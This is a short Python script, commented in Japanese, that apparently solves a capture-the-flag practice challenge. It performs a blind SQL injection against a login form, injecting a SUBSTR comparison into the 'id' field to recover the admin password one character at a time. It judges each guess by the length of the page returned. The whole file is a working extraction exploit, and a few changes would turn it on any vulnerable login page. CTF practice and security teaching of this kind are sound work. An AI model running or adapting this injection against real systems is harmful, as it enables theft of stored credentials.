import urllib.parse
import urllib.request
 
# url = 'http://ctfq.sweetduet.info:10080/~q6/'
url = 'http://ctfq.u1tramarine.blue/q6/'
 
print ("flag : ",end = '')
 
#フラグが30文字まで想定
for i in range(1, 30):
    #文字コードを１つずつ足していく a~z,A~Z,0~9,その他記号を想定
    for j in range(47,126):
        values = {'id' : 'admin\'  AND SUBSTR((SELECT pass FROM user WHERE id=\'admin\'),' + str(i) + ',1) = \'' + chr(j) + '\'--',
                  'pass' : '',}
        data = urllib.parse.urlencode(values)
        data = data.encode('utf-8') # data should be bytes
        req = urllib.request.Request(url, data)
        response = urllib.request.urlopen(req)
        the_page = response.read()
        #Congratulations!のページが開いたか判定
        if len(the_page) > 1000 :
            print (chr(j),end ='')
            break #次の文字へ
 
print ('')
